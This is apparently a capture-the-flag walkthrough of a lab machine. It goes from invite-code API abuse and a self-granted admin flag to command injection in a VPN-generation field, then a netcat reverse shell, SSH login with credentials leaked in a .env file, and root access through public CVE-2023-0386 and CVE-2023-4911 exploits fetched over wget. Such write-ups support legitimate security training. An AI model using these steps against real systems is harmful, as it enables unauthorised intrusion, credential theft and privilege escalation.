
- We start with a `nmap` scan on the IP address:
![[Pasted image 20250709114049.png]]

- we have the http port open so lets check the web site
- Also I opened `burpsuite` for checking the requests and responses

- Going through it I see something very interesting on the `[ FAQ ]` page![[Pasted image 20250709114233.png]]`In order to join you should solve an entry-level challenge that is presented here`
- It also tells us the to be able to do something after we are in we should `hack the invite process` 
- So lets click on `here`
![[Pasted image 20250709114617.png]]
- It is a form where we have to enter an Invite Code in order to sign up
- We try some Invite Code random but we get "Invalid invite code."

- By checking the response we get from the page we see that we have some scripts related to invites `/js/inviteapi.min.js`
![[Pasted image 20250709114910.png]]

- We go to the `js/inviteapi.min.js` and we get this obfuscated js script
![[Pasted image 20250709115244.png]]

- We use [UnPacker](https://matthewfl.com/unPacker.html) to get the JavaScript code in a format we understand
```js
function verifyInviteCode(code) 
	{ 
		var formData= 
			{ 
			"code":code 
		}; 
		$.ajax( 
				{ type:"POST",dataType:"json",data:formData,url:'/api/v1/invite/verify',success:function(response) 
					{ 
					console.log(response) 
				} 
				,error:function(response) 
					{ console.log(response) 
				} 
		} 
		) 
} 
function makeInviteCode() 
	{
	 $.ajax( 
			 { type:"POST",dataType:"json",url:'/api/v1/invite/how/to/generate',success:function(response) 
				 { 
				 console.log(response) 
			} 
			,error:function(response) 
					{ 
					console.log(response) 
				} 
		} 
		) 
}
```
- We get 2 functions but `makeInviteCode` seems more helpful, because we could generate an invite code

- As specified in the function we make a `POST` request using `curl` to `/api/v1/invite/how/to/generate` ![[Pasted image 20250709121134.png]]

- We get an encoded variable `data` so we decode it from `ROT13` using [CyberChef](https://gchq.github.io/CyberChef/) ![[Pasted image 20250709121348.png]]

- As instructed we make a `POST` request to `api/v1/invite/generate`![[Pasted image 20250709121436.png]]

- We get a code but is encoded so again we use [CyberChef](https://gchq.github.io/CyberChef/) which also suggests us that we should decode from `Base64` ![[Pasted image 20250709121621.png]]

- We got the Invite Code now let's introduce it and register
![[Pasted image 20250709121720.png]]
- And also login
![[Pasted image 20250709121746.png]]

- So we are in the `/home` page of the site ![[Pasted image 20250709121850.png]]

- By going through the site there is not much to see, but on `/home/access` page there are 2 buttons that have some functionality `Connection Pack` and `Regenerate` 
![[Pasted image 20250709122014.png]]

- So let's check what functions are connected to these buttons
![[Pasted image 20250709122113.png]]

- I try going to `api/v1/user/vpn/generate` and `api/v1/user/vpn/regenerate` but no luck in doing that

- After some long considerations and some help I find out that I can access `/api/v1`, which gives me this![[Pasted image 20250709122333.png]]

- Now there is something lookin very interesting : - the admin pages and their request methods 
	- the first one `GET - /api/v1/admin/auth` checks if the current user is admin
		- by open that page we get the output `{ "message":false }` so guess we are not admins ( yet :))) )
	- the second one `POST - /api/v1/admin/vpn/generate` - generates a VPN for a specific user but to use that we need admin permission, 
		- this might be interesting later after we get the permissions ( maybe we can get to run scripts to get us a reverse shell)
	- the third one `PUT - /api/v1/admin/settings/update` - now this might help us get that admin status

- Let's make a `PUT` request inside burp to `/api/v1/admin/settings/update`![[Pasted image 20250709122957.png]]

- Considering that in the message we have `Content-Type: application/json` let's specify the same in our `PUT` request

![[Pasted image 20250709123222.png]]
- Now lets enter the email we used for our new account:![[Pasted image 20250709123321.png]]

- After adding `is_admin` variable we get the next response ![[Pasted image 20250709123410.png]]

- Now if we check the `/api/v1/admin/auth` we see `{ "message":true }` meaning we are now admins

- Now lets see what we can do with the `POST` request to `/api/v1/admin/vpn/generate`
![[Pasted image 20250709123622.png]]

- After specifying our username ![[Pasted image 20250709123722.png]]
- We don't get too much from this `OpenVPN` certificate so there must be something else we can do

- After some thinking and some help I decided to run a listener on my machine and try to run a script inside the `username` variable to get a reverse shell on the target
- On my machine I started the listener
```shell
nc -lvnp 4444
```

- On the target I run the `POST` request but with the script inside the variable![[Pasted image 20250709124112.png]]

- IT WORKED, now I have a reverse shell as the user `www-data` 
![[Pasted image 20250709124156.png]]

- I run the command `ls -la` to see what I have in this directory and I find a suspicious `.env` file which I learned it contains valuable environmental variables and I was right![[Pasted image 20250709124329.png]]

- I got a username=`admin` and a password=`SuperDuperPass123`, now lets `ssh` with this credentials:
```shell
ssh admin@10.10.11.221
password:SuperDuperPass123
```

- WE ARE IN, so lets get the user flag from `user.txt`:
```shell
cat user.txt
```

#### Root Flag

#### Method 1 - Exploit of `OverlayFS / FUSE` (CVE-2023-0386)

- We use the `find` command to see what files are owned by us inside the file system:
```shell
find / -type f -user admin 2>/dev/null
```

- One file is particularly interesting which is a mail with our name on it `/var/mail/admin`
- By reading it we learn that there is a "nasty" CVE that could potential exploit the system, `the one in OverlayFS / FUSE`

- Searching it on the Internet I found that is the `CVE-2023-0386` exploit which is a `local privilege escalation` vulnerability 
- A system is likely to be vulnerable if it has a kernel version lower than `6.2` so we check with `uname -r`
```shell 
uname -r
5.15.70-051570-generic
```
- So it is vulnerable 

- I searched for the exploit and founded here https://github.com/sxlmnwb/CVE-2023-0386 now we get it on our machine 
```shell
git clone https://github.com/sxlmnwb/CVE-2023-0386
```
- then archive it:
```shell
tar -czvf ./CVE-2023-0386.tar.gz ./CVE-2023-0386 
```

- Now start a web server on our local machine and download the file from the target `admin` session
```shell
python3 -m http.server 80
```

- On the target machine download the exploit:
```shell
wget http://<your_IP>:80/CVE-2023-0386.tar.gz
```

- Unarchive it 
```shell
tar -xzvf ./CVE-2023-0386.tar.gz ./CVE-2023-0386
```

- By following the instruction of the exploit from the `README.md` file we:
	- Open another session with `ssh admin@10.10.11.221`
	- Then we enter in the folder in both sessions
	- In one of the sessions we use the command `make all` 
	- Now, in the first one type `./fuse ./ovlcap/lower ./gc`
	- In the second `./exp`

- WOILA you are the `root` user now![[Pasted image 20250709131103.png]]

#### Method 2 - Exploit of `GLIBC_TUNABLES` (CVE-2023-4911)

- By going through the Guided Mode on the HTB platform we learn about the existence of another script
- This vulnerability, is about the exploitation of the `GLIBC` library more precise the exploitation of the `GLIBC_TUNABLES` environment variable

- First we check the `GLIBC` version:
![[Pasted image 20250709131713.png]]

- After some search on the Internet we learn about the `CVE-2023-4911` vulnerability 
- The vulnerability can be found at this site https://github.com/NishanthAnand21/CVE-2023-4911-PoC 

- To check if the system is vulnerable we run the next command:
```shell
env -i "GLIBC_TUNABLES=glibc.malloc.mxfast=glibc.malloc.mxfast=A" "Z=`printf '%08192x' 1`" /usr/bin/su --help
```
- The output is `Segmentation fault (core dumped)` => it is vulnerable

- We clone the repository on our machine then create an archive
```shell
git clone https://github.com/NishanthAnand21/CVE-2023-4911-PoC 
```
```shell
tar -czvf ./CVE-2023-4911-PoC.tar.gz CVE-2023-4911-PoC
```

- then open a http server and form the target download the archive:
```shell
# On our machine
python3 -m http-server 80
```
```shell
# On target machine
wget http://<yout_IP>:80/CVE-2023-4911-PoC.tar.gz
```

- Unarchive the exploit:
```shell
tar -xzvf ./CVE-2023-4911-PoC.tar.gz ./CVE-2023-4911-PoC
```

- In the exploit directory do the following:
	- compile `exploit.c` : `gcc exploit.c -o exploit`
	- compile the script `genlib.py` : `python3 genlib.py`
	- the folder `'"'` is created
	- Lastly execute the exploit `./exploit`

- It takes some time so be patient 
- After it finished execution you will gain `root` access
![[Pasted image 20250709140049.png]]

